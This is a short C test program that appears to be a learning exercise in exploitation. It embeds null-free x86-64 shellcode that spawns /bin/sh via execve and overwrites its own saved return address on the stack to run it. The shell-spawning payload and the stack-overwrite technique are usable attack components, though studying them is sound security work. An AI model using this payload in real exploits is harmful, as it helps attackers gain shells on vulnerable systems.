#include <stdlib.h>
#include <stdio.h>


/*
	TESTING CODE without \x00
*/


int main(){
	/*
	* OVERRIDE THE RIP VALUE ON THE STACK
	*/
	char shellcode[] = "\xeb\x24\x5b\x48\x89\x5b\x08\x48\x31\xc0\x88\x43\x07\x48\x89\x43\x10\x31\xd2\x48\x8d\x73\x08\x48\x89\xdf\x31\xc0\xb0\x3b\x0f\x05\x31\xc0\xb0\x3c\x0f\x05\xe8\xd7\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
	long *ret;

	ret = (long*)((int*)&shellcode + 16) + 1;
	/*
	just another way of doing the same thing but this time shellcode is on the stack, so mprotect would need to be used in gdb to make that chunk of memory executable
	*/
	(*ret) = (long)shellcode; /*
	we need to override the address of rip to the adress of the first charac in the shellcode, since sizeof(char*) is 8 we can convert it to long to override the rip; the value on the machine is the same, it's just so that the compiler doesn't complain that we are assigning char* to long
	*/
	
}
